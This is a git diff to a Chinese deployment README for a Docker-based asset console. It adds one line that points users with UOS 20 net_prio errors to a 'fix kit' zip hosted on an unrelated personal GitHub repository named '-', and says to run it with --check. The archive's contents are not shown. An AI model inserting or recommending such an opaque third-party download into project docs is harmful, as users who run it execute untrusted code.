@@ -44,3 +44,5 @@ docker exec -it asset-console-web python manage.py init_admin
 ## Docker 创建容器报 net_prio 错误
 
 参见 [net_prio 故障排查](故障排查-net_prio.md)。本目录提供启动失败清理补丁 `docker-up.sh`，它不改变镜像或数据卷，不代替宿主 cgroup 配置修复。
+
+UOS 20 的 `net_prio` 控制器报错可使用[小型条件修复包](https://github.com/friendfan1/-/raw/refs/heads/main/delivery/net-prio-fix-kit.zip)，先执行 `--check`。具体条件与临时修复边界见故障排查文档。
